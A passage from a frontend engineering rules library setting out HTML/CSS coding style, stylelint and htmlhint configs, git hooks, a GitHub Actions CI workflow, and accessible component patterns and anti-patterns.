  to { transform: translateX(0); }
}

.toast {
  animation: slide-in var(--duration-medium) var(--easing-default);
}

@media (prefers-reduced-motion: reduce) {
  *,
  *::before,
  *::after {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
    scroll-behavior: auto !important;
  }
}
```

Per [`common/a11y.md`](../../rules-library/common/a11y.md) — vestibular disorders
are common; `prefers-reduced-motion` honored or animations
optional.

### 12. Colour contrast: AA minimum, AAA for critical paths

| Text class | WCAG AA | WCAG AAA |
| --- | --- | --- |
| Normal text (< 18pt) | 4.5:1 | 7:1 |
| Large text (≥ 18pt OR ≥ 14pt bold) | 3:1 | 4.5:1 |
| Non-text UI (borders, icons, focus rings) | 3:1 | n/a |

Tools: stylelint plugins, `axe-core`, Lighthouse, Chrome DevTools
Contrast Analyzer.

### 13. Naming: BEM + utility tiers OR pick-one

Two canonical conventions; PICK ONE per project:

```css
/* BEM — Block__Element--Modifier */
.card {}
.card__title {}
.card__title--large {}
.card--featured {}
.card--featured .card__title {}

/* Utility-first (Tailwind-shaped) — composable single-purpose classes */
.flex {}
.items-center {}
.gap-3 {}
.bg-brand-500 {}
.text-white {}
```

Project's CSS architecture document specifies the convention.
Mixed BEM-and-utility within one file is a smell.

### 14. CSS layer order

CSS Cascade Layers (CSS Cascade Level 5) let you order
specificity explicitly:

```css
@layer reset, tokens, base, components, utilities;

@layer reset {
  *, *::before, *::after { box-sizing: border-box; }
  /* modern reset rules */
}

@layer tokens {
  :root {
    --color-brand-500: #4f46e5;
    /* ... */
  }
}

@layer base {
  body { font-family: var(--font-body); }
  h1, h2, h3 { line-height: 1.2; }
}

@layer components {
  .button { /* ... */ }
}

@layer utilities {
  .sr-only { /* visually-hidden but screen-reader-accessible */ }
}
```

The layer order is declared once; subsequent rules in later
layers always win, regardless of specificity. This kills "I need
`!important` to override Bootstrap" scenarios.

### 15. No `!important` outside utility layer

Per [`common/coding-style.md`](../../rules-library/common/coding-style.md) — the
no-discards post-edit hook warns on `!important` in CSS. Allowed
ONLY in a utility-class layer where overrides are intentional.

```css
/* CORRECT — utility layer, explicit override */
@layer utilities {
  .hidden { display: none !important; }
  .sr-only {
    position: absolute !important;
    inline-size: 1px !important;
    /* ... */
  }
}

/* WRONG — fighting the cascade with !important inside components */
.card-title {
  color: red !important;  /* signal of architectural break */
}
```

### 16. Cleanroom modern CSS — no vendor prefixes by hand

Use `autoprefixer` (PostCSS plugin) configured via Browserslist.
The project's `.browserslistrc` declares the target browser
matrix; autoprefixer generates the necessary `-webkit-` /
`-moz-` / `-ms-` prefixes. Hand-written prefixes rot.

```text
# .browserslistrc
defaults
not IE 11
not Safari < 14
```

## Required `.stylelintrc.json`

```jsonc
{
  "extends": [
    "stylelint-config-standard",
    "stylelint-config-recess-order"
  ],
  "plugins": [
    "stylelint-order",
    "stylelint-a11y"
  ],
  "rules": {
    "color-no-invalid-hex": true,
    "color-named": "never",
    "color-no-hex": null,
    "no-duplicate-selectors": true,
    "selector-max-id": 0,
    "selector-max-class": 3,
    "selector-max-compound-selectors": 4,
    "selector-max-specificity": "0,4,0",
    "selector-no-qualifying-type": [true, { "ignore": ["attribute"] }],
    "declaration-no-important": [true, {
      "severity": "error"
    }],
    "max-nesting-depth": 3,
    "no-descending-specificity": true,
    "media-feature-range-notation": "context",
    "alpha-value-notation": "number",
    "color-function-notation": "modern",
    "hue-degree-notation": "angle",
    "value-no-vendor-prefix": [true, {
      "ignoreValues": ["box"]
    }],
    "property-no-vendor-prefix": true,
    "selector-no-vendor-prefix": true,
    "comment-empty-line-before": "always",
    "rule-empty-line-before": ["always", { "ignore": ["first-nested"] }],
    "function-no-unknown": [true, {
      "ignoreFunctions": ["theme", "v-bind"]
    }]
  }
}
```

## Required `.htmlhintrc`

```jsonc
{
  "tagname-lowercase": true,
  "attr-lowercase": true,
  "attr-value-double-quotes": true,
  "attr-value-not-empty": false,
  "attr-no-duplication": true,
  "doctype-first": true,
  "doctype-html5": true,
  "id-unique": true,
  "src-not-empty": true,
  "title-require": true,
  "alt-require": true,
  "head-script-disabled": true,
  "inline-script-disabled": false,
  "inline-style-disabled": true,
  "space-tab-mixed-disabled": "space",
  "id-class-ad-disabled": true,
  "href-abs-or-rel": false,
  "attr-unsafe-chars": true
}
```

## Naming

| Object | Convention | Example |
| --- | --- | --- |
| HTML id | `kebab-case` | `id="login-email"` |
| HTML data-attr | `kebab-case` | `data-test-id="cart-submit"` |
| HTML class | per-project (BEM or utility) | `.card__title`, `.flex` |
| CSS custom prop | `--kebab-case` with tier prefix | `--color-brand-500`, `--space-6` |
| CSS file | `kebab-case.css` | `button-primary.css` |
| CSS module | `<component>.module.css` | `Button.module.css` |
| BEM block | `kebab-case` | `.user-profile` |
| BEM element | `__kebab-case` | `.user-profile__avatar` |
| BEM modifier | `--kebab-case` | `.user-profile--featured` |

## Cross-references

- [`html-css/patterns.md`](../../rules-library/html-css/patterns.md) — component patterns
- [`html-css/security.md`](../../rules-library/html-css/security.md) — CSP, XSS, sanitisation
- [`html-css/testing.md`](../../rules-library/html-css/testing.md) — visual regression, axe
- [`html-css/hooks.md`](../../rules-library/html-css/hooks.md) — lint + format gates
- [`common/a11y.md`](../../rules-library/common/a11y.md) — WCAG 2.2 mandates
- [`common/i18n.md`](../../rules-library/common/i18n.md) — RTL + locale-aware
  number / date formatting
- [`common/coding-style.md`](../../rules-library/common/coding-style.md) — no
  raw colour literals; no `!important` outside utility layer
- [`common/no-discards.md`](../../rules-library/common/no-discards.md) — hook
  rejects raw colour literals in component CSS
- [`typescript/coding-style.md`](../../rules-library/typescript/coding-style.md)
  — React / Vue / Svelte component conventions
- [`common/documentation-requirements.md`](../../rules-library/common/documentation-requirements.md)
  — design-system documentation

## Why this rule exists

HTML + CSS are the most-consumed languages of any web product:
every user sees the output, including users with disabilities,
on poor networks, on small screens, in their second language.
Drift on semantic HTML breaks screen readers; drift on CSS
tokens breaks dark mode and theming; drift on focus styles
breaks keyboard users. The rules above codify the modern web
baseline.

Recurring incidents averted by this rule:

- A modal that traps screen readers because `<dialog>` was
  replaced with a `<div role="dialog">` without focus management
- A signup form that fails because `placeholder` is the only
  label and password managers can't autofill
- A button row that no keyboard user can reach because
  `outline: none` was applied without a replacement
- A dark-mode regression because a component hardcoded `#fff`
  instead of `var(--color-bg-elevated)`

## Learning hooks

Per [`common/continuous-learning-mandate.md`](../../rules/common/continuous-learning-mandate.md):

**Signals to watch**:

- `<div role="button">` / `<span onclick>` shipped instead of
  native semantic element (rule 1 violation)
- `<h1>` count > 1 on a page OR heading levels skipped (rule 2)
- `placeholder` used as the only label on a form input (rule 3)
- Image without `alt` attribute (vs `alt=""`) shipped (rule 4)
- Raw colour literal in component CSS (rule 6 + hook trigger)
- `<table>` used for layout (rule 7)
- Physical CSS property used where logical exists (rule 8 — RTL
  blocker)
- `outline: none` without a replacement (rule 9 — keyboard
  accessibility broken)
- Touch target < 24×24 CSS px shipped (rule 10 — WCAG 2.2 §2.5.8)
- `!important` inside non-utility layer (rule 15 violation)

**Refinement candidates**:

- New CSS module / convention row when a new CSS feature lands
  in the snapshot
- Tightening of the WCAG contrast floor when AAA usage proves
  feasible
- New cross-reference when a sister rule (a11y, i18n,
  frontend-patterns skill) gains a constraint the style rule
  must honour
- New token-tier entry when a recurring design class needs its
  own naming convention (semantic vs primitive tokens)

---

<!-- ============================================================
     Section: html-css/hooks.md
     ============================================================ -->

# HTML / CSS Hooks

> Auto-fires on every `*.html`, `*.htm`, `*.css`, `*.scss`,
> `*.sass`, `*.less`, `*.styl`, `*.module.css`, `*.postcssrc`,
> `*.stylelintrc*`, `*.htmlhintrc`, `tailwind.config.*`,
> `postcss.config.*`, `vite.config.*` file. Sister to
> [`common/hooks.md`](../../rules-library/common/hooks.md). Tooling:
> **stylelint 17.11.0** + **stylelint-config-standard 40.0.0**,
> **HTMLHint** (current), **Prettier 3.x**, **@axe-core/playwright**,
> **Lighthouse CI**, **pa11y-ci**, **size-limit** /
> **bundlewatch**, **autoprefixer** (via PostCSS).

## Pre-commit gates

`.githooks/pre-commit`:

```bash
#!/usr/bin/env bash
set -euo pipefail

staged_files=$(git diff --cached --name-only --diff-filter=ACMR)
staged_html=$(echo "$staged_files" | grep -E '\.(html?|hbs|ejs|liquid)$' || true)
staged_css=$(echo "$staged_files" | grep -E '\.(css|scss|sass|less|styl|module\.css)$' || true)

# Format check
if [ -n "$staged_html$staged_css" ]; then
  echo "$staged_html $staged_css" | xargs pnpm exec prettier --check
fi

# CSS lint
if [ -n "$staged_css" ]; then
  echo "$staged_css" | xargs pnpm exec stylelint
fi

# HTML lint
if [ -n "$staged_html" ]; then
  echo "$staged_html" | xargs pnpm exec htmlhint
fi
```

`.pre-commit-config.yaml` equivalent (pre-commit framework):

```yaml
---
repos:
  - repo: https://github.com/pre-commit/mirrors-prettier
    rev: v3.6.0
    hooks:
      - id: prettier
        types_or: [html, css, scss, sass, less, javascript, typescript]

  - repo: https://github.com/thibaudcolas/pre-commit-stylelint
    rev: v17.11.0
    hooks:
      - id: stylelint
        additional_dependencies:
          - "stylelint@17.11.0"
          - "stylelint-config-standard@40.0.0"
          - "stylelint-config-recess-order@7.4.0"
          - "stylelint-a11y@2.0.0"

  - repo: local
    hooks:
      - id: htmlhint
        name: htmlhint
        entry: pnpm exec htmlhint
        language: node
        files: \.(html?|hbs|ejs|liquid)$
```

## Pre-push gates

`.githooks/pre-push`:

```bash
#!/usr/bin/env bash
set -euo pipefail

# Build + type-check + tests + a11y in CI parity
bash infra/verify-local.sh
```

`infra/verify-local.sh` (excerpt):

```bash
#!/usr/bin/env bash
set -euo pipefail

pnpm install --frozen-lockfile
pnpm exec prettier --check '**/*.{html,css,scss,ts,tsx}'
pnpm exec stylelint '**/*.{css,scss,module.css}' --max-warnings 0
pnpm exec htmlhint '**/*.html'
pnpm exec tsc --noEmit
pnpm exec eslint --max-warnings 0
pnpm vitest run --coverage
pnpm test:a11y                              # jest-axe
pnpm build
pnpm exec lhci autorun                      # Lighthouse + a11y / perf budgets
pnpm exec size-limit                        # bundle budgets
```

Same script runs in CI per [`common/local-dev-setup.md`](../../rules-library/common/local-dev-setup.md).

## CI workflow (GitHub Actions)

```yaml
# .github/workflows/frontend-ci.yml
---
name: Frontend CI

on:
  pull_request:
    paths:
      - "**/*.html"
      - "**/*.css"
      - "**/*.scss"
      - "**/*.ts"
      - "**/*.tsx"
      - "package.json"
      - "pnpm-lock.yaml"

permissions:
  contents: read

jobs:
  lint-and-format:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.3.3
      - uses: pnpm/action-setup@fc06bc1257f339d1d5d8b3a19a8cae5388b55320 # v4.4.0
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with: { node-version: "22", cache: pnpm }

      - run: pnpm install --frozen-lockfile

      - name: Prettier
        run: pnpm exec prettier --check '**/*.{html,css,scss,ts,tsx,js,jsx,json,md}'

      - name: stylelint
        run: pnpm exec stylelint '**/*.{css,scss,module.css}' --max-warnings 0

      - name: HTMLHint
        run: pnpm exec htmlhint '**/*.html'

      - name: Type-check
        run: pnpm exec tsc --noEmit

      - name: ESLint
        run: pnpm exec eslint --max-warnings 0

  unit-and-a11y:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.3.3
      - uses: pnpm/action-setup@fc06bc1257f339d1d5d8b3a19a8cae5388b55320 # v4.4.0
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with: { node-version: "22", cache: pnpm }

      - run: pnpm install --frozen-lockfile
      - run: pnpm vitest run --coverage --reporter verbose
      - run: pnpm test:a11y                # jest-axe

      - uses: codecov/codecov-action@<sha-pinned> # vN.N.N
        with: { files: coverage/lcov.info }

  e2e:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        project: [chromium, firefox, webkit]
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.3.3
      - uses: pnpm/action-setup@fc06bc1257f339d1d5d8b3a19a8cae5388b55320 # v4.4.0
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with: { node-version: "22", cache: pnpm }

      - run: pnpm install --frozen-lockfile
      - run: pnpm exec playwright install --with-deps ${{ matrix.project }}
      - run: pnpm exec playwright test --project=${{ matrix.project }}

      - uses: actions/upload-artifact@<sha-pinned> # vN.N.N
        if: always()
        with:
          name: playwright-results-${{ matrix.project }}
          path: |
            playwright-report/
            test-results/
          retention-days: 30

  lighthouse:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.3.3
      - uses: pnpm/action-setup@fc06bc1257f339d1d5d8b3a19a8cae5388b55320 # v4.4.0
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with: { node-version: "22", cache: pnpm }

      - run: pnpm install --frozen-lockfile
      - run: pnpm build
      - run: pnpm exec lhci autorun

  visual:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.3.3
      - uses: pnpm/action-setup@fc06bc1257f339d1d5d8b3a19a8cae5388b55320 # v4.4.0
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with: { node-version: "22", cache: pnpm }

      - run: pnpm install --frozen-lockfile
      - name: Chromatic
        uses: chromaui/action@<sha-pinned> # vN.N.N
        with:
          projectToken: ${{ secrets.CHROMATIC_PROJECT_TOKEN }}
          autoAcceptChanges: false
          exitZeroOnChanges: false

  size:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.3.3
      - uses: pnpm/action-setup@fc06bc1257f339d1d5d8b3a19a8cae5388b55320 # v4.4.0
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with: { node-version: "22", cache: pnpm }

      - run: pnpm install --frozen-lockfile
      - run: pnpm build
      - run: pnpm exec size-limit
```

## IDE integration

### VS Code / Cursor / Windsurf

`.vscode/settings.json`:

```jsonc
{
  "editor.formatOnSave": true,
  "editor.defaultFormatter": "esbenp.prettier-vscode",
  "editor.codeActionsOnSave": {
    "source.fixAll.stylelint": "explicit",
    "source.fixAll.eslint": "explicit"
  },
  "stylelint.validate": ["css", "scss", "vue", "svelte"],
  "stylelint.snippet": ["css", "scss"],
  "css.validate": false,
  "scss.validate": false,
  "less.validate": false,
  "html.format.enable": false,
  "files.associations": {
    "*.css": "css",
    "*.module.css": "css",
    "*.svelte": "svelte"
  }
}
```

`css.validate: false` disables VS Code's built-in CSS validator
so stylelint owns the lint surface. Otherwise diagnostics
duplicate.

### Recommended extensions

| Publisher | Extension | Purpose |
| --- | --- | --- |
| `esbenp.prettier-vscode` | Prettier | Format-on-save |
| `stylelint.vscode-stylelint` | Stylelint | CSS lint |
| `htmlhint.vscode-htmlhint` | HTMLHint | HTML lint |
| `dbaeumer.vscode-eslint` | ESLint | JS / TS / Vue / Svelte lint |
| `bradlc.vscode-tailwindcss` | Tailwind CSS IntelliSense | Tailwind autocomplete |
| `deque-systems.vscode-axe-linter` | axe Linter | Inline a11y warnings |
| `webhint.vscode-webhint` | webhint | WCAG + perf hints |
| `formulahendry.auto-rename-tag` | Auto Rename Tag | HTML tag rename pairs |

Per [`common/install-allowlist.md`](../../rules-library/common/install-allowlist.md)
— stick to verified publishers; `htmlhint.*` is the official
htmlhint VS Code extension (confirmed publisher).

### JetBrains IDEs (WebStorm / IntelliJ)

- Settings → Languages & Frameworks → Style Sheets → Code Quality
  Tools → Stylelint: enable
- Settings → Languages & Frameworks → JavaScript → Prettier:
  enable; run on save
- Settings → Languages & Frameworks → JavaScript → Code Quality
  Tools → ESLint: enable

## Pre-deployment checklist

Before pushing or opening a PR that touches HTML / CSS:

```bash
# 1. Format
pnpm exec prettier --check '**/*.{html,css,scss,ts,tsx}'

# 2. Lint
pnpm exec stylelint '**/*.{css,scss,module.css}' --max-warnings 0
pnpm exec htmlhint '**/*.html'

# 3. Type-check + JS / TS lint
pnpm exec tsc --noEmit
pnpm exec eslint --max-warnings 0

# 4. Unit + a11y
pnpm vitest run --coverage
pnpm test:a11y

# 5. E2E + cross-browser
pnpm exec playwright test

# 6. Visual regression
pnpm chromatic --exit-zero-on-changes

# 7. Performance + a11y budgets
pnpm exec lhci autorun

# 8. Bundle size
pnpm exec size-limit

# 9. Secret scan
gitleaks detect --source . --redact
```

Pre-push hook wraps all of these via `infra/verify-local.sh`.

## Verification block

After every HTML / CSS edit:

```text
Frontend sweep (this turn):
  - prettier --check: clean
  - stylelint --max-warnings 0: 0 warnings
  - htmlhint: 0 errors
  - tsc --noEmit: 0 errors
  - eslint --max-warnings 0: 0 warnings
  - vitest --coverage: 94% lines (touched files); 87% project
  - jest-axe: 0 violations
  - playwright (chromium + firefox + webkit): 47/47 pass
  - chromatic: 0 visual changes
  - lhci: perf 96, a11y 100, BP 100, SEO 100
  - size-limit: main bundle 142 KB (under 150 KB budget)
```

Per [`common/verify-before-claim.md`](../../rules/common/verify-before-claim.md).

## Cross-references

- [`html-css/coding-style.md`](../../rules-library/html-css/coding-style.md) — semantic
  HTML + token-driven CSS
- [`html-css/patterns.md`](../../rules-library/html-css/patterns.md) — component
  composition + APG patterns
- [`html-css/security.md`](../../rules-library/html-css/security.md) — CSP, Trusted Types,
  sanitisation gates
- [`html-css/testing.md`](../../rules-library/html-css/testing.md) — unit + a11y + visual +
  E2E + perf layers
- [`common/hooks.md`](../../rules-library/common/hooks.md) — hook lifecycle
- [`common/extreme-lint-policy.md`](../../rules-library/common/extreme-lint-policy.md)
  — strict lint posture
- [`common/security-controls-org-wide.md`](../../rules-library/common/security-controls-org-wide.md)
  — SHA-pinned actions
- [`common/local-dev-setup.md`](../../rules-library/common/local-dev-setup.md)
  — verify-local.sh + CI parity
- [`common/verify-before-claim.md`](../../rules/common/verify-before-claim.md)
  — same-turn verification block
- [`common/a11y.md`](../../rules-library/common/a11y.md) — WCAG 2.2 AA gate
- [`typescript/hooks.md`](../../rules-library/typescript/hooks.md) — JS / TS
  side of the same workflow
- `frontend-patterns` skill (auto-activates on UI files) —
  visual design quality bar

## Why this rule exists

Frontend CI without these gates ships:

- Inconsistent formatting (one team uses Prettier, another
  doesn't — diff churn)
- Stylelint warnings that turn into accepted noise
- HTML markup that passes review but fails htmlhint (missing
  alt attrs, duplicate ids, inline styles)
- Accessibility regressions that surface only after a customer
  complaint
- Visual regressions that the team didn't notice until a user
  reported a broken layout
- Bundle bloat from a casual dep import
- Perf regressions that move Core Web Vitals out of "Good"

Each gate adds CI seconds to minutes; each catch is hours of
incident response avoided.

## Learning hooks

Per [`common/continuous-learning-mandate.md`](../../rules/common/continuous-learning-mandate.md):

**Signals to watch**:

- Stylelint pre-commit hook bypassed via `--no-verify`
  (gate weakening)
- New action used without SHA pin in workflow file
- Test:a11y job skipped or made conditional in a PR (rule §A03
  weakening — sister `common/a11y.md`)
- Lighthouse threshold regressed past the budget for > 1 PR
  cycle without rollback (perf budget drift)
- Visual regression baseline accepted without human review
  (rule weakening)
- Bundle size grows past the budget without justification
  (rule 9 weakening)
- IDE settings file missing the stylelint validate list (DX
  weakening — devs author without inline validation)

**Refinement candidates**:

- New CI job row when a new frontend tool (Biome, Oxlint,
  Rolldown) gains team adoption
- Tightening of the prettier scope when a recurring formatting
  drift class emerges (e.g., new file type)
- New IDE recommendation when a maintained extension provides
  better inline feedback
- New cross-reference when a sister rule (frontend-patterns
  skill, common/dependency-vulnerabilities) adds a gate the
  workflow must include

---

<!-- ============================================================
     Section: html-css/patterns.md
     ============================================================ -->

# HTML / CSS Patterns

> Auto-fires on every `*.html`, `*.css`, `*.scss`, `*.less`,
> `*.styl`, `*.module.css`, `*.css.ts`, `*.styled.ts`,
> `*.vue` `<style>` blocks, `*.svelte` `<style>` blocks file.
> Standards: **HTML Living Standard**, **CSS Snapshot 2026**,
> **WAI-ARIA Authoring Practices Guide (APG)**, **Material
> Design 3**, **Apple Human Interface Guidelines**, **Inclusive
> Components (Heydon Pickering)**, **Every Layout (Andy Bell +
> Heydon Pickering)**, **CUBE CSS (Andy Bell)**, **Design Tokens
> Community Group spec**.

## Core Principle

**Components compose from primitives; primitives compose from
tokens. Layout is a separate concern from theme — a Stack /
Cluster / Grid layout primitive doesn't know about colour, a
Button component doesn't know about spacing direction. The
design system owns the tokens; product code consumes them.
Accessibility is a CONSTRAINT, not a feature — every component
ships with keyboard + screen-reader support from day one.**

## Architectural patterns

### Pattern 1: Token tiers (primitive → semantic → component)

Three layers of CSS custom properties:

```css
/* tokens/primitives.css — raw values, no semantic meaning */
:root {
  --slate-50: oklch(98% 0.005 240);
  --slate-900: oklch(20% 0.015 240);
  --indigo-500: oklch(60% 0.18 264);
  --indigo-700: oklch(45% 0.20 264);

  --size-1: 0.25rem;
  --size-2: 0.5rem;
  --size-3: 0.75rem;
  --size-4: 1rem;
  --size-6: 1.5rem;

  --font-sans: "Inter", system-ui, sans-serif;
  --font-mono: "JetBrains Mono", ui-monospace, monospace;
}

/* tokens/semantic.css — names the role, references primitives */
:root {
  --color-bg-canvas: var(--slate-50);
  --color-bg-elevated: white;
  --color-text-default: var(--slate-900);
  --color-text-on-brand: white;

  --color-brand-default: var(--indigo-500);
  --color-brand-hover: var(--indigo-700);

  --space-inset-sm: var(--size-2);
  --space-inset-md: var(--size-3);
  --space-stack-md: var(--size-4);
}

@media (prefers-color-scheme: dark) {
  :root {
    --color-bg-canvas: var(--slate-900);
    --color-bg-elevated: oklch(25% 0.015 240);
    --color-text-default: var(--slate-50);
  }
}

/* components/button.css — references semantic tokens */
.button {
  background: var(--color-brand-default);
  color: var(--color-text-on-brand);
  padding: var(--space-inset-sm) var(--space-inset-md);
}
.button:hover { background: var(--color-brand-hover); }
```

Dark mode + brand swaps + accessibility-mode (high-contrast)
change a handful of semantic tokens; the entire component tree
re-renders correctly.

### Pattern 2: Layout primitives (Every-Layout style)

Reusable layout components, each owning ONE composition rule:

```css
/* Stack — vertical rhythm with consistent gap */
.stack {
  display: flex;
  flex-direction: column;
  gap: var(--space-stack-md);
}

/* Cluster — horizontal items with wrap */
.cluster {
  display: flex;
  flex-wrap: wrap;
  gap: var(--space-inset-md);
  align-items: center;
}

/* Sidebar — content beside a sidebar that becomes vertical at narrow widths */
.sidebar-layout {
  display: flex;
  flex-wrap: wrap;
  gap: var(--space-6);
}
.sidebar-layout > :first-child { flex-basis: 18rem; flex-grow: 1; }
.sidebar-layout > :last-child { flex-basis: 0; flex-grow: 999; min-inline-size: 50%; }

/* Center — horizontally-centred content with max-width */
.center {
  box-sizing: content-box;
  margin-inline: auto;
  max-inline-size: 60ch;
  padding-inline: var(--space-6);
}

/* Cover — full-viewport coverage with optional vertical centering */
.cover {
  display: flex;
  flex-direction: column;
  min-block-size: 100dvb;
}

/* Grid — auto-fitting responsive grid */
.grid-auto {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(min(100%, 18rem), 1fr));
  gap: var(--space-6);
}
```

Layout primitives are content-agnostic. A "Stack" doesn't know
if its children are paragraphs or cards. Composition stays
predictable.

### Pattern 3: Accessible component pattern (WAI-ARIA APG)

For every interactive component, follow the WAI-ARIA Authoring
Practices Guide pattern. Example: Disclosure / Accordion using
native HTML where possible:

```html
<details class="disclosure">
  <summary class="disclosure__trigger">
    What is included in the plan?
  </summary>
  <div class="disclosure__content">
    <p>Plan includes unlimited storage, …</p>
  </div>
</details>

<!-- Custom disclosure (when <details> doesn't fit) -->
<div class="disclosure">
  <button
    type="button"
    aria-expanded="false"
    aria-controls="panel-1"
    id="trigger-1"
    class="disclosure__trigger">
    Section title
  </button>
  <div id="panel-1" role="region" aria-labelledby="trigger-1" hidden>
    Section content
  </div>
</div>
```

Tab interaction pattern requires:

- `role="tablist"` on container
- `role="tab"` on each tab; `aria-selected="true"` on active
- `role="tabpanel"` with `aria-labelledby="<tab-id>"`
- Arrow keys (Left/Right or Up/Down) switch tabs
- Home/End jump to first/last tab
- Tab key moves into the panel content

Per [`common/a11y.md`](../../rules-library/common/a11y.md) — keyboard model must
match the APG-specified interaction.

### Pattern 4: Container queries for component-aware design

```css
.product-card {
  container-type: inline-size;
  container-name: card;
}

.product-card__layout {
  display: grid;
  grid-template-columns: 1fr;
  gap: var(--space-4);
}

@container card (inline-size > 32rem) {
  .product-card__layout {
    grid-template-columns: 1fr 2fr;
  }
}
```

Container queries replace responsive design driven by viewport
media queries when the trigger is the component's available
space (e.g., card layout in a grid varies by grid column width).

### Pattern 5: Compound components (React / Vue / Svelte)

The compound-component pattern lets consumers compose semantic
HTML structure inside a styled wrapper:

```tsx
// React example
<Card>
  <Card.Header>
    <Card.Title>Order #12345</Card.Title>
    <Card.Actions>
      <Button variant="ghost">Edit</Button>
    </Card.Actions>
  </Card.Header>
  <Card.Body>
    {/* content */}
  </Card.Body>
  <Card.Footer>
    <Button>Submit</Button>
  </Card.Footer>
</Card>
```

The wrapper applies token-driven styling; the sub-components
emit semantic HTML (`<header>`, `<h3>`, `<footer>`).

### Pattern 6: Form pattern (label + input + hint + error)

```html
<div class="form-field">
  <label for="email" class="form-field__label">Email</label>
  <input
    id="email"
    name="email"
    type="email"
    autocomplete="email"
    required
    aria-describedby="email-hint email-error"
    aria-invalid="false"
    class="form-field__input"
  />
  <p id="email-hint" class="form-field__hint">
    We'll use this to send your receipt.
  </p>
  <p id="email-error" class="form-field__error" role="alert" hidden>
    Enter a valid email address.
  </p>
</div>
```

On error:

- `aria-invalid="true"` on the input
- `hidden` removed from the error element
- Focus moves to the FIRST invalid field on submit failure
- Per-field validation triggers on blur, not on every keystroke
  (no noisy AT announcements)

### Pattern 7: Dialog / modal pattern

Modern HTML provides `<dialog>` natively:

```html
<button type="button" id="open-dialog">Confirm deletion</button>

<dialog id="confirm-delete">
  <form method="dialog" class="confirm-dialog">
    <h2 id="confirm-title">Delete order?</h2>
    <p id="confirm-desc">
      This will permanently remove order #12345 and cannot be undone.
    </p>
    <div class="confirm-dialog__actions">
      <button type="submit" value="cancel">Cancel</button>
      <button type="submit" value="confirm" class="button--danger">Delete</button>
    </div>
  </form>
</dialog>

<script>
  const dialog = document.getElementById('confirm-delete');
  const trigger = document.getElementById('open-dialog');

  trigger.addEventListener('click', () => {
    dialog.showModal();             // native focus trap + backdrop
  });

  dialog.addEventListener('close', () => {
    trigger.focus();                // return focus to trigger
    if (dialog.returnValue === 'confirm') { /* perform action */ }
  });
</script>
```

`<dialog>` provides:

- Native focus trap (no library required)
- Backdrop via `::backdrop` pseudo-element
- Escape-key dismissal
- `inert`-style "rest of page" behaviour

For older browsers / specific UX needs, the React Aria / Radix
UI / Headless UI libraries provide accessible dialog primitives.

### Pattern 8: Skeleton / loading state pattern

```css
.skeleton {
  background: linear-gradient(
    90deg,
    var(--color-bg-skeleton-base) 0%,
    var(--color-bg-skeleton-shimmer) 50%,
    var(--color-bg-skeleton-base) 100%
  );
  background-size: 200% 100%;
  animation: skeleton-shimmer 1.5s infinite;
  border-radius: var(--radius-md);
}

@keyframes skeleton-shimmer {
  from { background-position: 200% 0; }
  to { background-position: -200% 0; }
}

@media (prefers-reduced-motion: reduce) {
  .skeleton { animation: none; }
}
```

Skeletons render with `aria-hidden="true"` + an
`aria-live="polite"` region above announcing loading state.

## CSS architecture conventions

### CUBE CSS (Andy Bell)

```text
C — Composition: layout primitives (Stack, Cluster, Sidebar, Grid)
U — Utilities: single-purpose classes (.flow, .visually-hidden)
B — Block: named components with isolated styles
E — Exceptions: data-attribute-based variants (data-state="open")
```

### BEM (Block Element Modifier)

```text
.user-profile           — block
.user-profile__avatar   — element of block
.user-profile--admin    — modifier
.user-profile__avatar--large  — element with modifier
```

### Utility-first (Tailwind-shaped)

```html
<div class="flex items-center gap-3 rounded-lg bg-brand-500 p-4 text-white">
  …
</div>
```

Project's CSS architecture document picks ONE — mixed-and-matched
within a file is the anti-pattern.

## Anti-patterns

### Anti-pattern 1: ID selectors in CSS

```css
/* WRONG — specificity 0,1,0,0 — wins everything */
#main-nav { color: blue; }

/* RIGHT */
.main-nav { color: blue; }
```

`stylelint`'s `selector-max-id: 0` enforces.

### Anti-pattern 2: Nested deep selectors

```css
/* WRONG — fragile to DOM changes */
.card .header .title-row .title h2 { font-size: 1.25rem; }

/* RIGHT — direct class */
.card__title { font-size: 1.25rem; }
```

`stylelint`'s `selector-max-compound-selectors: 4`.

### Anti-pattern 3: Style attribute in HTML

```html
<!-- WRONG -->
<div style="color: red; font-size: 18px;">Error</div>

<!-- RIGHT -->
<div class="error-message">Error</div>
```

Inline styles break CSP (per [`html-css/security.md`](../../rules-library/html-css/security.md)),
defeat caching, defeat dark mode, defeat theming.

### Anti-pattern 4: Tab indices > 0

```html
<!-- WRONG — manually-set tabindex breaks the natural focus order -->
<button tabindex="1">First</button>
<button tabindex="2">Second</button>
<button tabindex="3">Third</button>

<!-- RIGHT — natural DOM order = natural focus order -->
<button>First</button>
<button>Second</button>
<button>Third</button>

<!-- Acceptable — tabindex="-1" makes element focusable programmatically -->
<div tabindex="-1" id="focus-target">Skip target</div>
```

### Anti-pattern 5: Click handler on non-button element

```html
<!-- WRONG -->
<div class="card" onclick="navigate('/order/12345')">…</div>

<!-- RIGHT — make the whole card a link or wrap the title -->
<article class="card">
  <h2><a href="/order/12345" class="card__link-overlay">Order #12345</a></h2>
  …
</article>

<style>
  .card { position: relative; }
